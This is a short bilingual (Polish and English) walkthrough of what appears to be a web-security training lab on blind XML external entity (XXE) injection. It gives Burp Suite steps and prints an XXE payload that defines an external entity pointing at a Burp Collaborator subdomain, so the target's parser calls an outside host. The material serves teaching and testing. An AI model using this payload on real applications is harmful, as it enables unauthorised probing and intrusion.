This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

1. Włączamy zadanie na stronie oraz uruchamiamy burpa, wchodzimy w kategorię, włączamy intercepta, wybieramy miasto, a następnie klikamy check stock
2. Przechwycone połączenie wysyłąmy dp repetera i wyłączamy intercepta, Widzimy że połączenie zawiera xml, więc modyfikujemy połączenie  i wpisujemy <!DOCTYPE foo [<!ENTITY xxe SYSTEM "TUTAJ WRZUCANY LINK WYGENEROWANY, PRZEZ BURP COLABBORATOR">]>  pod productid wpisujemy &xxe;
3. klikamy send, dostajemy 400 bad request, wchodzimy w burp collaborator client, klikamy pull now i widzimy, że udało nam się przechwycić http z kodem 

ENG:

1.Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
2.Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
3.Replace the productId number with a reference to the external entity:
&xxe;
4.Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.